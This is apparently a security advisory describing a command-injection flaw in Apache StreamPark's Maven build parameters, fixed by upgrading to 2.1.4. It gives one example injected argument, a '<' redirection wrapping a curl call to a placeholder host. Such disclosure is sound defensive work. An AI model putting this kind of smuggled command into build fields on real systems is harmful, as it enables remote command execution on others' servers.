summary: |
  Apache StreamPark: Unchecked maven build params could trigger remote command execution
  In streampark, the project module integrates Maven's compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.

  Background:

  In the "Project" module, the maven build args  “<” operator causes command injection. e.g : “< (curl  http://xxx.com )” will be executed as a command injection,

  Mitigation:

  all users should upgrade to 2.1.4,  The "<" operator will blocked。
